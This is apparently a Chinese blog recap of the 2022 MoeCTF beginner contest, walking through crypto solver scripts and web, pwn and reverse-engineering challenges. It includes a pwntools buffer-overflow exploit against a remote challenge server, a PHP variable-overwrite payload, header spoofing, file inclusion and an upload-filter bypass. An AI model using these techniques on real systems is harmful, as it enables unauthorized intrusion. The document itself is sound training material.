---
title: 2022Moectf
date: 2022-10-27 19:36:39
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![image-20220929183418047](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291834248.png?x-oss-process=hzy)

<!--more-->

Moectf西电CTF新生赛

# 前言

很适合新手，难度有阶梯，边学边实战，在全菜的路上越走越远

# 古典密码

## ABCDEFG~

> 题目描述：字母儿歌你会倒着唱吗？（大写）

密文是

```
moectf{18 24 26 13 08 18 13 20 26 15 11 19 26 25 22 07 08 12 13 20}
```

字母歌，倒着唱，所以字母表倒着排序

```
26A、25B、24C、23D、22E、21F、20G、19H、18I、17J、16K、15L、14M、13N、12O、11P、10Q、9R、8S、7T、6U、5V、4W、3X、2Y、1Z
```

得到flag

moectf{ICANSINGALPHABETSONG}

## 小小凯撒

> 题目描述：好像大小写都有呢。
>
> 提示：
>      <0> 尝试若干次不正确的话，不妨换个思路？关注一下字母表，建议自己写脚本
>      <1> 解出flag之后请手动加上moectf{}
>      <2> 每个单词首字母大写，其余小写，无分隔

密文是

```
kqEftuEUEftqOADDqoFRxmsOAzsDmFGxmFuAzE
```

脚本如下

```
def casearDecrypt(ciphertext, source_char, destination_char, list_all): 
    
    if list_all == True:
        for offset in range(1, 27):
            convertChar(offset)
    else:
        offset =  ord(destination_char) - ord(source_char)
        convertChar(offset)
 
def convertChar(offset):
    chars = "abcdefghijklmnopqrstuvwxyz"
    for char in ciphertext:
         
        is_upper_flag = 0
        if char.isupper():
            char = char.lower()
            is_upper_flag = 1
         
        if char not in chars:
            outputChar(is_upper_flag, char)
            continue
         
        tempchar_ascii = ord(char) + offset
        tempchar =chr(tempchar_ascii)
        if tempchar not in chars:
            if offset < 0:
                tempchar_ascii += len(chars)
            else:
                tempchar_ascii -= len(chars)
        tempchar = chr(tempchar_ascii)
        outputChar(is_upper_flag, tempchar)
    print("")
 
def outputChar(is_upper_flag, char):
    
    if is_upper_flag == 1:
        print(char.upper(), end="")
    else:
        print(char, end="")
 
ciphertext = input("Please input ciphertext:\n")
while True:
    operation = input("List all results?y/n:")
    if operation == 'y' or operation == 'Y':
        casearDecrypt(ciphertext, '', '', True)
        break
    elif operation == 'n' or operation == 'N':
        des_char = input("Please input destination_char:\n")
        sors_char = input("Please input source_char:\n")
        casearDecrypt(ciphertext, sors_char, des_char, False)
        break
    else:
        print("Input error! Please input y/n:")
```

![image-20220827111722524](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271117166.png?x-oss-process=hzy)

moectf{yeSthiSIStheCORRecTFlagCOngRaTUlaTiOnS}

所以flag为moectf{YesThisIsTheCorrectFlagCongratulations}

## 凯撒变异了

> 题目描述：神秘的变异人凯撒来自track曾经的出发地：114514市
> 提示：
>      <0> 请先完成小小凯撒（字母表小写+大写52位
>      <1> flag无字母以外的其他字符

密文是

```
ZpyLfxGmelDeftewJwFbwDGssZszbliileadaa
```

这里浅浅学一下，毕竟没咋接触过密码学，还是有好多地方不会的

搜了一下，所谓变异凯撒就是偏移量改变了，需要自己看一下偏移量

```
ZpyLfxGmelDeftewJwFbwDGssZszbliileadaa  // 抽开始的Zpy这三个吧，对应的应该是moe
Z，p，y对应的ascll为90，112，121，moe对应ascll为109，111，101，之间相差貌似不是一致的，那应该不是这个关系
abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ
Z->m  13
p->o 
```

暂时没思路

## Vigenère

> 题目描述：维基百科说： 维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”（法语：le chiffre indéchiffrable）。  那么聪明的你能够破解嘛？
> 提示：
>      <0>  flag格式：全部小写，下划线分隔

![image-20220828091325926](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208280913072.png?x-oss-process=hzy)

就是维吉尼亚加密，难点就是得爆破key

刚开始找到的脚本爆破密钥但是发现解出来不全，脚本也贴一下吧

```
'''维吉尼亚破解'''
import numpy as np
import wordninja

def alpha(cipher): #预处理,去掉空格以及回车 
    c = ''
    for i in range(len(cipher)):
        if(cipher[i].isalpha()):
            c += cipher[i]
    return c

def count_IC(cipher): #给定字符串计算其重合指数 
    count = [0 for i in range(26)]
    L = len(cipher)
    IC = 0.0
    for i in range(len(cipher)):
        if(cipher[i].isupper()):
            count[ord(cipher[i])-ord('A')] += 1
        elif(cipher[i].islower()):
            count[ord(cipher[i])-ord('a')] += 1
    for i in range(26):
        IC += (count[i]*(count[i]-1))/(L*(L-1))
    return IC

def count_key_len(cipher,key_len): #对字符串按输入个数进行分组，计算每一组的IC值返回平均值
    N = ['' for i in range(key_len)]
    IC = [0 for i in range(key_len)]
    for i in range(len(cipher)):
        m = i % key_len
        N[m] += cipher[i]
    for i in range(key_len):
        IC[i] = count_IC(N[i])
    #print(IC)
    print("长度为%d时,平均重合指数为%.5f" % (key_len,np.mean(IC)))
    return np.mean(IC)    

def length(cipher): #遍历确定最有可能的密钥长度返回密钥长度 
    key_len = 0
    mins = 100
    aver = 0.0
    for i in range(1,10):
        k = count_key_len(cipher,i)
        if(abs(k-0.065)<mins):
            mins = abs(k-0.065)
            key_len = i
            aver = k
    print("密钥长度为%d,此时重合指数每组的平均值为%.5f" % (key_len,aver))
    return key_len
    
def count_MIC(c1,c2,n): #n=k1-k2为偏移量,计算c1,c2互重合指数MIC
    count_1 = [0 for i in range(26)]
    count_2 = [0 for i in range(26)]
    L_1 = len(c1)
    L_2 = len(c2)
    MIC = 0
    for i in range(L_1):
        if(c1[i].isupper()):
            count_1[ord(c1[i])-ord('A')] += 1
        elif(c1[i].islower()):
            count_1[ord(c1[i])-ord('a')] += 1         
    for i in range(L_2):
        if(c2[i].isupper()):   
            count_2[(ord(c2[i])-ord('A')+n+26)% 26] += 1
        elif(c2[i].islower()):
            count_2[(ord(c2[i])-ord('a')+n+26)% 26] += 1   
    for i in range(26):
        MIC += count_1[i]*count_2[i]/(L_1*L_2)
    return MIC

def count_n(c1,c2): #确定两个子串最优的相对偏移量n=k1-k2
    n = 0
    mins = 100
    k = [0.0 for i in range(26)]
    for i in range(26):
        k[i] = count_MIC(c1,c2,i)
        #print(i,k[i])  
        if(abs(k[i]-0.065)<mins):
            mins = abs(k[i]-0.065)
            n = i      
    return n
        
def  group_k(cipher,key_len):#完成分组操作并计算每一组与第一组的最优相对偏移量并返回
    N = ['' for i in range(key_len)]
    MIC = [0 for i in range(key_len)]
    s = [0 for i in range(key_len)]
    for i in range(len(cipher)): #对密文进行分组 
        m = i % key_len
        N[m] += cipher[i] 
    for i in range(1,key_len):  #计算与第一组之间的相对偏移量 
        s[i] = count_n(N[0],N[i])  # s[i] = k1-k(i+1) 
        MIC[i] = count_MIC(N[0],N[i],s[i])  # MIC[i] = MIC(1,i+1)
        print("第1组和第%d组之间偏移为%d时，互重合指数为%.5f" % (i+1,s[i],MIC[i]))
    return s    

def miyao(key_len,s,k):  #k为第一个子串的移位，输出密钥并返回密钥所有字母的下标
    mi = ['' for i in range(key_len)] 
    for i in range(key_len):
        s[i] = -s[i]+k   #k2=k1-n
        mi[i] = chr((s[i]+26) % 26 + ord('a'))
    print("第一个偏移量为%d,密钥为%s时" % (k,mi))
    return s

def the_end(cipher,key_len,s):#输入密文密钥返回明文结果 
    plain ='' 
    i = 0 
    while( i < len(cipher)):
        for j in range(key_len):
            if(cipher[i].isupper()):
                plain += chr((ord(cipher[i])-ord('A')-s[j]+26) % 26 + ord('A'))
            else:
                plain += chr((ord(cipher[i])-ord('a')-s[j]+26) % 26 + ord('a'))
            i+=1
            if(i == len(cipher)):
                break 
   # print(plain) 
    return plain
             
if __name__ == "__main__":
    fp = open("附件.txt","r")
    cipher = '' 
    for i in fp.readlines():
        cipher = cipher + i    
    fp.close()
    cipher = alpha(cipher)
    key_len = length(cipher)
    s = group_k(cipher,key_len)
    m = s.copy()
    for k in range(26):
        s = m.copy() 
        s = miyao(key_len,s,k)
        plain = the_end(cipher,key_len,s)
        print(plain[0:20]) #输出部分明文确定偏移量k1
    print("参考输出，请输入第一个子串的偏移量:",end='')
    k = int(input())
    m = miyao(key_len,m,k)
    plain = the_end(cipher,key_len,m)

    '''对英文文本进行分词'''
    word = wordninja.split(plain)
    plain = ''
    for i in range(len(word)):
        plain += word[i]
        plain += ' '
    print("明文为\n"+plain)

```

![image-20220828092436088](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208280924192.png?x-oss-process=hzy)

通过脚本其实就可以确定偏移量是19，密钥是tfdvsjuz了

然后找个在线解密的，就可以解密了，我找到个可以在线爆破密钥的网站又爆破了一次

[Vigenere Solver - www.guballa.de](https://guballa.de/vigenere-solver)

```
information security, sometimes shortened to infosec, is the practice of protecting information by mitigating information risks. it is part of information risk management. it typically involves preventing or reducing the probability of unauthorized/inappropriate access to data, or the unlawful use, disclosure, disruption, deletion, corruption, modification, inspection, recording, or devaluation of information. it also involves actions intended to reduce the adverse impacts of such incidents. protected information may take any form, e.g. electronic or physical, tangible (e.g. paperwork) or intangible (e.g. knowledge). information security's primary focus is the balanced protection of the confidentiality, integrity, and availability of data (also known as the cia triad) while maintaining a focus on efficient policy implementation, all without hampering organization productivity. this is largely achieved through a structured risk management process that involves:
1. identifying information and related assets, plus potential threats, vulnerabilities, and impacts;
2. evaluating the risks
3. deciding how to address or treat the risks i.e. to avoid, mitigate, share or accept them
4. where risk mitigation is required, selecting or designing appropriate security controls and implementing them
5. monitoring the activities, making adjustments as necessary to address any issues, changes and improvement opportunities
6. i won't tell you that the flag is moectf attacking the vigenere cipher is interesting
to standardize this discipline, academics and professionals collaborate to offer guidance, policies, and industry standards on password, antivirus software, firewall, encryption software, legal liability, security awareness and training, and so forth. this standardization may be further driven by a wide variety of laws and regulations that affect how data is accessed, processed, stored, transferred and destroyed. however, the implementation of any standards and guidance within an entity may have limited effect if a culture of continual improvement isn't adopted.
```

moectf{attacking_the_vigenere_cipher_is_interesting}

# 计算机技术基础

## run me

> 题目描述：下载文件，双击运行得flag~ 但是我的程序好像会闪退欸，能不能想个办法保留一下它的输出？比如用CMD来运行它试试？ 如果你不知道什么是CMD，可以尝试使用搜索引擎来学习，加油吧(> <)

![image-20220826213225038](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262132099.png?x-oss-process=hzy)

实在人啊，真的直接就cmd了

moectf{run_me_to_get_the_flag}

## CCCCC

> 题目描述：C语言是学习计算机基础中的基础,也是计算机第一学期的必修课。本题你需要配置一个能够编译运行C语言程序的环境,并运行题目给出的代码来获取flag。 By the way: 如果你看不懂这段代码,仅仅只是运行得到了flag,后面的题做起来会有一点困难奥。

![image-20220826213511903](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262135972.png?x-oss-process=hzy)

就是给个程序，跑就行了

moectf{0h_y0u_can_run_a_C_pr0gram!}

## Python

跟上题一样，跑就完了

moectf{Python_YYDS!}

## run me 2

> 题目描述：下载文件，运行得flag~ 诶诶出了点小问题，好像不能运行？！因为这个程序是Linux操作系统下的可执行文件，不再是 Windows了。 请尝试配置一个Linux环境（虚拟机或者WSL）来运行它。

跑就完了

![image-20220826214028903](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262140946.png?x-oss-process=hzy)

moectf{run_m3_t0_g3t_th3_f1ag}

# Web审计与渗透测试

## web安全之入门指北

![image-20220826214235285](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262142331.png?x-oss-process=hzy)

moeCTF{g3t_aUthor1zed_bef0r3_PENTEST!}

## ezhtml

> 题目描述：cyxq高考并不是很理想，你能帮他把成绩改到600分以上用来截图吗 题目地址：82.156.5.200:1038

![image-20220826214411779](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262144869.png?x-oss-process=hzy)

直接看js文件

```
moectf{W3lc0me_to_theWorldOf_Web!}
```

## God_of_Aim

> 题目描述：Ghost最近沉迷FPS，你能打通这个小游戏吗？题目地址：82.156.5.200:1039

![image-20220826214641538](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262146597.png?x-oss-process=hzy)

![image-20220826214705189](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262147232.png?x-oss-process=hzy)

玩一下

![image-20220826223156539](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262231620.png?x-oss-process=hzy)

![image-20220826223814550](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262238621.png?x-oss-process=hzy)

js泄露，hex转str即可

moectf{Oh_you_can_a1m_and_H4ck_Javascript}

## 支付系统

> 题目描述：只要100块钱就能买到flag呢

题目如下

```
import os
import uuid
from quart import Quart, render_template, redirect, jsonify, request, session
from hashlib import pbkdf2_hmac
from enum import IntEnum
from tortoise import fields
from tortoise.models import Model
from tortoise.contrib.quart import register_tortoise
from httpx import AsyncClient

app = Quart(__name__)
app.secret_key = os.urandom(16)


class TransactionStatus(IntEnum):
    SUCCESS = 0
    PENDING = 1
    FAILED = 2
    TIMEOUT = 3


class Transaction(Model):
    id = fields.IntField(pk=True)
    user = fields.UUIDField()
    amount = fields.IntField()
    status = fields.IntEnumField(TransactionStatus)
    desc = fields.TextField()
    hash = fields.CharField(64, null=True)

    def __init__(self, **kwargs):
        super().__init__()
        for k, v in kwargs.items():
            self.__setattr__(k, v)


async def do_callback(transaction: Transaction):
    async with AsyncClient() as ses:
        transaction.status = int(TransactionStatus.FAILED)
        data = (
            f'{transaction.id}'
            f'{transaction.user}'
            f'{transaction.amount}'
            f'{transaction.status}'
            f'{transaction.desc}'
        ).encode()
        await ses.post(f'http://localhost:8000/callback', data={
            'id': transaction.id,
            'user': transaction.user,
            'amount': transaction.amount,
            'desc': transaction.desc,
            'status': transaction.status,
            'hash': pbkdf2_hmac('sha256', data, app.secret_key, 2**20).hex()
        })


@app.before_request
async def create_session():
    if 'uid' not in session:
        session['uid'] = str(uuid.uuid4())
    session['balance'] = 0
    for tr in await Transaction.filter(user=session['uid']).all():
        if tr.status == TransactionStatus.SUCCESS:
            session['balance'] += tr.amount


@app.route('/pay')
async def pay():
    transaction = await Transaction.create(
        amount=request.args.get('amount'),
        desc=request.args.get('desc'),
        status=TransactionStatus.PENDING,
        user=uuid.UUID(session.get('uid'))
    )
    app.add_background_task(do_callback, transaction)
    return redirect(f'/transaction?id={transaction.id}')


@app.route('/callback', methods=['POST'])
async def callback():
    form = dict(await request.form)
    data = (
        f'{form.get("id")}'
        f'{form.get("user")}'
        f'{form.get("amount")}'
        f'{form.get("status")}'
        f'{form.get("desc")}'
    ).encode()
    k = pbkdf2_hmac('sha256', data, app.secret_key, 2**20).hex()
    tr = await Transaction.get(id=int(form.pop('id')))
    if k != form.get("hash") or int(form.pop('amount')) != tr.amount:
        return '403'
    form['status'] = TransactionStatus(int(form.pop('status')))
    tr.update_from_dict(form)
    await tr.save()
    return 'ok'


@app.route('/transaction')
async def transaction():
    if 'id' not in request.args:
        return '404'
    transaction = await Transaction.get(id=request.args.get('id'))
    return await render_template('receipt.html', transaction=transaction)


@app.route('/flag')
async def flag():
    return await render_template(
        'flag.html',
        balance=session['balance'],
        flag=os.getenv('FLAG'),
    )


@app.route('/')
@app.route('/index.html')
async def index():
    with open(__file__) as f:
        return await render_template('source-highlight.html', code=f.read())


register_tortoise(
    app,
    db_url="sqlite://./data.db",
    modules={"models": [__name__]},
    generate_schemas=True,
)

if __name__ == '__main__':
    app.run()
```

这个一直没啥思路，中间出题人又改了题目

> <0> [8.29 15:30] 修改了题目，去除了amount校验

```
import os
import uuid
from quart import Quart, render_template, redirect, jsonify, request, session
from hashlib import pbkdf2_hmac
from enum import IntEnum
from tortoise import fields
from tortoise.models import Model
from tortoise.contrib.quart import register_tortoise
from httpx import AsyncClient

app = Quart(__name__)
app.secret_key = os.urandom(16)


class TransactionStatus(IntEnum):   #实现事务状态功能
    SUCCESS = 0
    PENDING = 1  # pending
    FAILED = 2
    TIMEOUT = 3


class Transaction(Model):      # 交易功能实现
    id = fields.IntField(pk=True)
    user = fields.UUIDField()
    amount = fields.IntField()
    status = fields.IntEnumField(TransactionStatus)
    desc = fields.TextField()
    hash = fields.CharField(64, null=True)

    def __init__(self, **kwargs):
        super().__init__()
        for k, v in kwargs.items():
            self.__setattr__(k, v)


async def do_callback(transaction: Transaction):   # 回调函数
    async with AsyncClient() as ses:
        transaction.status = int(TransactionStatus.FAILED)
        data = (
            f'{transaction.id}'
            f'{transaction.user}'
            f'{transaction.amount}'
            f'{transaction.status}'
            f'{transaction.desc}'
        ).encode()
        await ses.post(f'http://localhost:8000/callback', data={
            'id': transaction.id,
            'user': transaction.user,
            'amount': transaction.amount,
            'desc': transaction.desc,
            'status': transaction.status,
            'hash': pbkdf2_hmac('sha256', data, app.secret_key, 2**20).hex()
        })


@app.before_request
async def create_session():
    if 'uid' not in session:       # 调用数据库查寻uid
        session['uid'] = str(uuid.uuid4())
    session['balance'] = 0
    for tr in await Transaction.filter(user=session['uid']).all():
        if tr.status == TransactionStatus.SUCCESS:
            session['balance'] += tr.amount    # 关键点，找到对应用户即可实现加钱功能


@app.route('/pay')    # 实现支付功能
async def pay():
    transaction = await Transaction.create(
        amount=request.args.get('amount'),
        desc=request.args.get('desc'),
        status=TransactionStatus.PENDING,
        user=uuid.UUID(session.get('uid'))
    )
    app.add_background_task(do_callback, transaction)
    return redirect(f'/transaction?id={transaction.id}')

 
@app.route('/callback', methods=['POST'])     # 回调路由
async def callback(): 
    form = dict(await request.form)
    data = (
        f'{form.get("id")}'
        f'{form.get("user")}'
        f'{form.get("amount")}'
        f'{form.get("status")}'
        f'{form.get("desc")}'
    ).encode()
    k = pbkdf2_hmac('sha256', data, app.secret_key, 2**20).hex()
    tr = await Transaction.get(id=int(form.pop('id')))
    if k != form.get("hash"):
        return '403'
    form['status'] = TransactionStatus(int(form.pop('status')))
    tr.update_from_dict(form)
    await tr.save()
    return 'ok'


@app.route('/transaction')    # 交易
async def transaction():
    if 'id' not in request.args:
        return '404'
    transaction = await Transaction.get(id=request.args.get('id'))
    return await render_template('receipt.html', transaction=transaction)   # 收据


@app.route('/flag')
async def flag():
    return await render_template(
        'flag.html',
        balance=session['balance'],
        flag=os.getenv('FLAG'),
    )


@app.route('/')
@app.route('/index.html')
async def index():
    with open(__file__) as f:
        return await render_template('source-highlight.html', code=f.read())


register_tortoise(
    app,
    db_url="sqlite://./data.db",
    modules={"models": [__name__]},
    generate_schemas=True,
)

if __name__ == '__main__':
    app.run()
```



## cookiehead

基础题目，考察几个请求头

![image-20220828161837065](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281618146.png?x-oss-process=hzy)

首先是本地访问,加XFF

![image-20220828161929502](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281619553.png?x-oss-process=hzy)

然后是登录，改cookie

![image-20220828161959407](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281619468.png?x-oss-process=hzy)

from地址，加referer

这题其实该拿一血的，但是就不知道迷瞪啥呢，我没加全，就加了127.0.0.1，后边又加了/index，最后才把全部都放上去，结果在我交flag前三秒，一血出了

moectf{th1s_is_http_protocolllll}

## baby_file

> 题目描述：“海纳百川，有容乃大；壁立千仞，无欲则刚。” 寓意人要像大海能容纳无数江河水一样的胸襟宽广，以容纳和融合来对他人。

![image-20220828182922293](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281829373.png?x-oss-process=hzy)

直接文件包含

![image-20220828183106616](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281831693.png?x-oss-process=hzy)

```
<?php
Hey hey, reach the highest city in the world! Actually I am ikun!!;

moectf{Y0u_are_t00_baby_la};

?>
```

moectf{Y0u_are_t00_baby_la}

## ezphp

> 题目描述：最近AQ喜欢上了一款多人在线作战游戏，但是他总是几分钟就GG了，这时他身边的h4haha说:"你一来就全面火力覆盖啊！这不就赢了吗?"

```
<?php

highlight_file('source.txt');
echo "<br><br>";

$flag = 'xxxxxxxx';
$giveme = 'can can need flag!';
$getout = 'No! flag.Try again. Come on!';
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($giveme);
}

if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
    exit($getout);
}

foreach ($_POST as $key => $value) {
    $$key = $value;
}

foreach ($_GET as $key => $value) {
    $$key = $$value;
}

echo 'the flag is : ' . $flag;

?>
```

变量覆盖就行，post都没执行，直接全get传参

```
?513=flag&flag=513
```

![image-20220828205855281](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208282058364.png?x-oss-process=hzy)

moectf{Wa0g_Yi1g_Chu0}

## What are you uploading

> 题目描述：can can need 马?????！

上个der![image-20220828223201270](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208282232357.png?x-oss-process=hzy)

就是前端js绕过

![image-20220828223243847](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208282232904.png?x-oss-process=hzy)

所以就直接传个这个名字

![image-20220828223310659](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208282233735.png?x-oss-process=hzy)

moectf{A0_Qua1_D0ne!}

# 二进制漏洞审计

## 二进制漏洞审计之入门指北

moectf{QwQ_We1com3_t0_pwn_ToT}

## shell

> 题目描述：你会用 Linux 吗? 你知道什么是 Shell 吗? 题目地址：nc 43.136.137.17 3907

![image-20220826215144687](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262151738.png?x-oss-process=hzy)

moectf{W3lc0m3_t0_The_Pwn_W0r1d}

## int_overflow

> 题目描述：来做小学数学题! 题目地址： nc 43.136.137.17 3908

看题目名字，那应该就是考察的整数溢出

看下功能![image-20220827114350835](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271143911.png?x-oss-process=hzy)

就是一个算数，giao，显然是个不可能回答正确的问题

check一下

![image-20220827114605093](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271146142.png?x-oss-process=hzy)



ida看主体逻辑

![image-20220827114657137](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271146202.png?x-oss-process=hzy)

我看到了/bin/sh，哦吼吼，同时可以看到他的这个问题的数字都是随机生成的，问题不大，只要correctt了，就会执行system

## ret2text

checksec  64位

![image-20220920142837389](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209201428470.png?x-oss-process=hzy)

main函数如下

![image-20220920143013539](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209201430612.png?x-oss-process=hzy)

![image-20220920143049521](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209201430593.png?x-oss-process=hzy)

shell地址是0x14BA，exp如下

```
from pwn import *

#p=process('./pwn')
p=remote('124.223.158.81',27002)
payload = b'a'*72 + p64(0x4014C2)  
p.sendline(payload)
p.interactive()
```

![image-20220920143150318](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209201431376.png?x-oss-process=hzy)

moectf{h3y_y0u_kn0w_wh47_15_574ck_0v32_f10w}

# 现代密码学

## 密码学之入门指北

题目如下

![image-20220827112953173](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271129258.png?x-oss-process=hzy)

脚本如下：

```
# solution1 for ex1
from Crypto.Util.number import long_to_bytes,inverse

def dec(c):#不用搜索！解一个二元方程组即可
    a=inverse((ord('c')-ord('t')),256)*(c[3]-c[4])%256
    b=(c[0]-ord('m')*a)%256
    print("a=",a,"b=",b)
    print(bytes(list(map(lambda x:(x-b)*inverse(a,256)%256,c))))
    return
    
c=long_to_bytes(23904604480218951222924468885892706253385766083586197703800132687872601727899557854623831975886365472122)

dec(c)  // a= 13 b= 33  b'moectf{Welc0me_t0_fascinating_crypto_w0rld}'
```

moectf{Welc0me_t0_fascinating_crypto_w0rld}

## 0rsa0

题目如下

```
from Crypto.Util.number import *
from flag import flag

assert flag[0:7] == b'moectf{'
assert flag[-1:] == b'}'
flag = flag[7:-1]
assert len(flag) == 32

m1 = bytes_to_long(flag[0:16])
m2 = bytes_to_long(flag[16:32])

def enc1(m):
    p = getPrime(512)
    q = getPrime(512)
    n = p * q
    e = 3
    c = pow(m,e,n)
    return n,e,c

def enc2(m):
    p = getPrime(512)
    q = getPrime(512)
    e = 65537
    d = inverse(e,(p-1)*(q-1))
    n = p * q 
    dp2 = d % (p-1)
    c = pow(m,e,n)
    return n,e,c,dp2

n1,e1,c1 = enc1(m1)
n2,e2,c2,dp2 = enc2(m2)

print("n1="+ str(n1))
print("e1="+ str(e1))
print("c1="+ str(c1))
print("n2="+ str(n2))
print("e2="+ str(e2))
print("c2="+ str(c2))
print("dp2="+ str(dp2))

'''
n1=133024413746207623787624696996450696028790885302997888417950218110624599333002677651319135333439059708696691802077223829846594660086912881559705074934655646133379015018208216486164888406398123943796359972475427652972055533125099746441089220943904185289464863994194089394637271086436301059396682856176212902707
e1=3
c1=1402983421957507617092580232325850324755110618998641078304840725502785669308938910491971922889485661674385555242824
n2=159054389158529397912052248500898471690131016887756654738868415880711791524038820158051782236121110394481656324333254185994103242391825337525378467922406901521793714621471618374673206963439266173586955520902823718942484039624752828390110673871132116507696336326760564857012559508160068814801483975094383392729
e2=65537
c2=37819867277367678387219893740454448327093874982803387661058084123080177731002392119369718466140559855145584144511271801362374042596420131167791821955469392938900319510220897100118141494412797730438963434604351102878410868789119825127662728307578251855605147607595591813395984880381435422467527232180612935306
dp2=947639117873589776036311153850942192190143164329999603361788468962756751774397111913170053010412835033030478855001898886178148944512883446156861610917865
'''
```

这是两道rsa题目，第一道是给了n，c，e，小e低指数攻击，先分解n成俩大素数

```
import gmpy2
import libnum

def de(c, e, n):
    k = 0
    while True:
        mm = c + n*k
        result, flag = gmpy2.iroot(mm, e)
        if True == flag:
            return result
        k += 1
e= 3
c = 1402983421957507617092580232325850324755110618998641078304840725502785669308938910491971922889485661674385555242824
n = 133024413746207623787624696996450696028790885302997888417950218110624599333002677651319135333439059708696691802077223829846594660086912881559705074934655646133379015018208216486164888406398123943796359972475427652972055533125099746441089220943904185289464863994194089394637271086436301059396682856176212902707

m=de(c,e,n)
print(m)
print(libnum.n2s(int(m)).decode())

//111948302617335386234579104898884924274
//T8uus_23jkjw_asr

```

第二道rsa的e就不小了，dp泄露

```
import gmpy2 as gp

e = 65537
n = gp.mpz(159054389158529397912052248500898471690131016887756654738868415880711791524038820158051782236121110394481656324333254185994103242391825337525378467922406901521793714621471618374673206963439266173586955520902823718942484039624752828390110673871132116507696336326760564857012559508160068814801483975094383392729)
dp = gp.mpz(947639117873589776036311153850942192190143164329999603361788468962756751774397111913170053010412835033030478855001898886178148944512883446156861610917865)

c = gp.mpz(37819867277367678387219893740454448327093874982803387661058084123080177731002392119369718466140559855145584144511271801362374042596420131167791821955469392938900319510220897100118141494412797730438963434604351102878410868789119825127662728307578251855605147607595591813395984880381435422467527232180612935306)
for x in range(1, e):
    if(e*dp%x==1):
        p=(e*dp-1)//x+1
        if(n%p!=0):
            continue
        q=n//p
        phin=(p-1)*(q-1)
        d=gp.invert(e, phin)
        m=gp.powmod(c, d, n)
        if(len(hex(m)[2:])%2==1):
            continue
        print('--------------')
        print(m)
        print(hex(m)[2:])
        print(bytes.fromhex(hex(m)[2:]))
//126543499036541017633689010451217675108
5f336433326177642135662623407364
//b'_3d32awd!5f&#@sd'
```

moectf{T8uus_23jkjw_asr_3d32awd!5f&#@sd}

## 一次就好

题目如下

```
from Crypto.Util.strxor import strxor
from Crypto.Util.number import *
from gmpy2 import powmod,next_prime
from FLAG import flag
import codecs

c = b'Just once,I will accompany you to see the world'
flag = flag.ljust(len(c),'#')
key = strxor(flag.encode(), c)
m = bytes_to_long(key)

p = getPrime(512)
q = next_prime(p)
N = p*q
e = 0x10001

gift = powmod(m, e, N)

print(gift)
print(N)

# gift = 127749242340004016446001520961422059381052911692861305057396462507126566256652316418648339729479729456613704261614569202080544183416817827900318057127539938899577580150210279291202882125162360563285794285643498788533366420857232908632854569967831654923280152015070999912426044356353393293132914925252494215314
# N = 164395171965189899201846744244839588935095288852148507114700855000512464673975991783671493756953831066569435489213778701866548078207835105414442567008315975881952023037557292470005621852113709605286462434049311321175270134326956812936961821511753256992797013020030263567313257339785161436188882721736453384403


```

gift是c，知道n，c，e=65537，啊不对，不是c，不会

# 软件逆向工程

## check in

> 题目描述：这是一道非常简单的签到题，借助IDA可以很快capture the flag~ 如果你不知道IDA是什么，可以借助搜索引擎来学习。群文件中有IDA，关于IDA使用可以看https://www.bilibili.com/video/BV1F54y1h7BS?p=4&share_source=copy_web（从15分钟开始看）

![image-20220826215346987](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262153047.png?x-oss-process=hzy)

moectf{Enjoy_yourself_in_Reverse_Engineering!!!}

## Hex

> 题目描述：查看文件16进制内容的工具:Notepad++,WinHex,010(推荐)

![image-20220826215604920](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262156965.png?x-oss-process=hzy)

![image-20220826215820286](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262158333.png?x-oss-process=hzy)

moectf{Hello_Hex}

## 逆向工程之入门指北

> 题目描述：开始你的逆向工程之旅吧～

moectf{0hhhhhhh_I_kn0w_hoW_t0_R3v3rs3!}

## begin

> 题目描述：xor，异或，是一种神奇的运算。当用异或对一段数据进行加密，怎样才能将密文恢复成明文呢？ 搜索引擎会告诉你答案~加油吧

主体逻辑如下

![image-20220830223143390](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208302231541.png?x-oss-process=hzy)

就是输入一个值进行异或加密之后和s2进行对照，然后一样就会输出good

说明flag就是s2，跟进提取逆向输出得到flag

```
